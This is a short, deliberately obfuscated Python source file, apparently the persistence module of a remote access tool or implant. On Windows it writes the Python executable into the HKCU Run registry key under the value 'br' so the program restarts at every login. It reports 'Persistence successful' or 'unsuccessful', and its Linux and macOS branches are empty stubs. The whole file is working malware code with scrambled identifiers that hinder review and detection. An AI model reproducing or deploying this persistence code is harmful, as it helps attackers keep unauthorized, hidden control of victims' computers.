# -*- coding: utf-8 -*-
import sys
def JZjNpUnETUJrnOtJucnIbTcmBTRjKEbG():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
    IaqFykPaTvrndCcdwYjXphjNhzzrHCpq = r'Software\Microsoft\Windows\CurrentVersion\Run'
    HZwfUUwUcdLYkgZhWYYFESDrVJfwPfUv = sys.executable
    try:
        SCTheZDdPbWCDfSRtlmTRIgFkflcOLkb = _winreg.OpenKey(HKCU, IaqFykPaTvrndCcdwYjXphjNhzzrHCpq, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(SCTheZDdPbWCDfSRtlmTRIgFkflcOLkb, 'br', 0, _winreg.REG_SZ, HZwfUUwUcdLYkgZhWYYFESDrVJfwPfUv)
        _winreg.CloseKey(SCTheZDdPbWCDfSRtlmTRIgFkflcOLkb)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        return False, 'HKCU Run registry key failed'
def eNuQLcwblRkMgmgKfCBAHEPSONeRSChG():
    return False, 'nothing here yet'
def UNProeYqWpAoJSywSlEmZafEghKSpCKo():
    return False, 'nothing here yet'
def KSPHuMocsXbfrKZwRqaErcEfeKhnQFFv(plat_type):
    if plat_type.startswith('win'):
        DnOzaeycHfRcHnadlVHzEZNTVgZWQkpY, tJUeinFFADlCvNgIGJTySwKOoKVIHchg = JZjNpUnETUJrnOtJucnIbTcmBTRjKEbG()
    elif plat_type.startswith('linux'):
        DnOzaeycHfRcHnadlVHzEZNTVgZWQkpY, tJUeinFFADlCvNgIGJTySwKOoKVIHchg = eNuQLcwblRkMgmgKfCBAHEPSONeRSChG()
    elif plat_type.startswith('darwin'):
        DnOzaeycHfRcHnadlVHzEZNTVgZWQkpY, tJUeinFFADlCvNgIGJTySwKOoKVIHchg = UNProeYqWpAoJSywSlEmZafEghKSpCKo()
    else:
        return 'Error, platform unsupported.'
    if DnOzaeycHfRcHnadlVHzEZNTVgZWQkpY:
        hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt = 'Persistence successful, {}.'.format(tJUeinFFADlCvNgIGJTySwKOoKVIHchg)
    else:
        hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt = 'Persistence unsuccessful, {}.'.format(tJUeinFFADlCvNgIGJTySwKOoKVIHchg)
    return hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt
